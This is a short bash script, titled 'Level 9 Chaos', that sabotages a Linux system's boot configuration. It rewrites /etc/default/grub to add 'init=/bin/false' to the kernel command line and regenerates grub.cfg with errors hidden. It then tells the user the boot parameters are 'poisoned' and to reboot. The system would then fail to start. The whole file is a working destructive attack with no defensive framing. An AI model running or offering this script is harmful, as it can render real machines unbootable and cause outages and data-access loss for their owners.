#!/bin/bash
# Level 9 Chaos
if [ -f "/etc/default/grub" ]; then
    sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="init=\/bin\/false /g' /etc/default/grub
    if [ -d "/boot/efi/EFI/redhat" ]; then
        grub2-mkconfig -o /boot/efi/EFI/redhat/grub.cfg 2>/dev/null
    fi
    grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
fi
echo "[!] Boot parameters poisoned. Reboot the system now."
